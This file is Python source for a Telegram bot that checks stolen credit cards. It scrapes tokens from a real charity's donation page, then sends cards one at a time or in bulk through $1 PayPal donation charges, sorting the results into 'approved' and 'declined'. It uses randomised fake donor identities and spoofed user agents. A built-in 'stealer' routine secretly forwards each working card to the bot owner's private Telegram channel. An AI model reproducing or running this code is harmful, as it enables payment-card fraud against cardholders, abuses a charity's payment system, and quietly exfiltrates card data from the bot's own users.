import time
import asyncio
import re
import os
import random
import string
import base64
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "PayPal Custom $1"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

# -------------------------------------------------------------
# PayPal Class (same logic as original)
# -------------------------------------------------------------
class PayPalCustom:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        url = 'https://riversidefoxfoundation.org/donations/an-evening-at-the-fox/'
        parsed = urlparse(url)
        domain = parsed.netloc
        path = parsed.path
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.url = domain
        self.inurl = path
        self.email = f"{random.choice(self.first_name)}{random.choice(self.last_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()

    def Key(self):
        he1 = {'upgrade-insecure-requests': '1', 'user-agent': self.uu.random}
        r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1)
        self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
        self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
        self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Krs(self, ccx):
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        he2 = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}
        da1 = {
            'give-honeypot': '',
            'give-form-id-prefix': self.id_form1,
            'give-form-id': self.id_form2,
            'give-form-title': 'Make a One-off Donation',
            'give-current-url': f'https://{self.url}{self.inurl}',
            'give-form-url': f'https://{self.url}{self.inurl}',
            'give-form-minimum': self.donation,
            'give-form-maximum': '50000',
            'give-form-hash': self.nonec,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': self.donation,
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': self.donation,
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'card_name': 'msms',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_gift_check_is_billing_address': 'no',
            'give_gift_aid_address_option': 'billing_address',
            'give_gift_aid_card_first_name': '',
            'give_gift_aid_card_last_name': '',
            'give_gift_aid_billing_country': 'GB',
            'give_gift_aid_card_address': '',
            'give_gift_aid_card_address_2': '',
            'give_gift_aid_card_city': '',
            'give_gift_aid_card_state': '',
            'give_gift_aid_card_zip': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        r2 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=he2, data=da1)
        da2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        he3 = {'accept': '*/*', 'content-type': da2.content_type, 'user-agent': self.uu.random}
        pa1 = {'action': 'give_paypal_commerce_create_order'}
        r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
        he4 = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {self.au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3)
        da4 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, self.donation),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, self.donation),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        he5 = {'accept': '*/*', 'content-type': da4.content_type, 'user-agent': self.uu.random}
        pa2 = {'action': 'give_paypal_commerce_approve_order', 'order': r3}
        r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        text = r5.text
        # Map response to readable message (original mapping)
        if 'true' in text or 'sucsess' in text:
            return "CHARGE 1.00$"
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY_LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            try:
                result = r5.json()['data']['error']
                return result
            except:
                return "UNKNOWN_ERROR"

# -------------------------------------------------------------
# Synchronous wrapper for a single card
# -------------------------------------------------------------
def process_card_sync(card_line):
    try:
        # validate format
        parts = card_line.split('|')
        if len(parts) != 4:
            return "Error", "Invalid format (use cc|mm|yyyy|cvv)"
        cc = f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"
        # Run the PayPal flow
        pp = PayPalCustom()
        pp.Key()
        result = pp.Krs(cc)
        # Determine status based on result
        if "CHARGE" in result or "INSUFFICIENT_FUNDS" in result:
            return "Approved ✅", result
        else:
            return "Declined ❌", result
    except Exception as e:
        return "Error", str(e)[:50]

# -------------------------------------------------------------
# Stealer function (keeps owner line – change if needed)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper
# -------------------------------------------------------------
async def call_paypal_custom_api(fullcc):
    loop = asyncio.get_running_loop()
    status, msg = await loop.run_in_executor(None, process_card_sync, fullcc)
    return status, msg

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/pc)
# -------------------------------------------------------------
@Client.on_message(filters.command("pc", [".", "/"]))
async def paypal_custom_single(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /pc

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /pc cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mm, yy, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await call_paypal_custom_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mpc)
# -------------------------------------------------------------
@Client.on_message(filters.command("mpc", [".", "/"]))
async def paypal_custom_mass(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mpc

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mpc cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tpc)
# -------------------------------------------------------------
@Client.on_message(filters.command("tpc", [".", "/"]))
async def paypal_custom_txt(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tpc

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING (with progress, separate approved, declined summary)
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    progress_text = f"""PayPal Custom $1
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""
    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed
        status, response = await call_paypal_custom_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": response, "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        try:
            await Client.edit_message_text(message.chat.id, progress_msg.id,
                f"""PayPal Custom $1
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
